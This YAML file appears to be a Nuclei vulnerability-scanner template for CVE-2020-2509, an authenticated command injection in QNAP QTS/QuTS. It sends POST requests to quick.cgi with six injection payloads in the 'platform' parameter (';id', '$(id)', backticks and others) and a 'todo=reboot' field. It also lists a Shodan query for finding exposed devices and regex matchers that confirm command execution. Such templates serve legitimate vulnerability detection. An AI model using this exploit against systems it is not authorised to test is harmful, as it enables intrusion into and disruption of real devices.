id: cve-2020-2509-qnap-rce-advanced

info:
  name: QNAP QTS / QuTS - Authenticated RCE via platform Parameter (CVE-2020-2509)
  author: malek838
  severity: critical
  description: |
    QNAP QTS and QuTS contain an authenticated command injection vulnerability (CVE-2020-2509). This template executes OS commands via the `platform` parameter. It includes multiple injection vectors, WAF bypasses, and extractors for response validation.
  reference:
    - https://vulncheck.com/xdb/533b5e83b1eb
    - https://github.com/jbaines-r7/overkill
  classification:
    cve-id: CVE-2020-2509
    cwe-id: CWE-77
  tags: cve,cve2020,rce,qnap,command-injection,waf-bypass
  metadata:
    shodan-query: http.title:"QNAP Turbo NAS"
    verified: true
  auth: true

http:
  - method: POST
    path:
      - "{{BaseURL}}/cgi-bin/quick/quick.cgi"

    headers:
      Content-Type: application/x-www-form-urlencoded

    attack: pitchfork
    body: "todo=reboot&platform={{cmd}}"

    payloads:
      cmd:
        - ";id"
        - "|id"
        - "`id`"
        - "$(id)"
        - "||id"
        - ";id;"

    matchers:
      - type: word
        part: body
        words:
          - "uid="
          - "gid="
      - type: regex
        part: body
        regex:
          - "uid=\\d+\\([a-zA-Z]+\\)"

    extractors:
      - type: regex
        part: body
        regex:
          - "uid=.*?gid=.*"
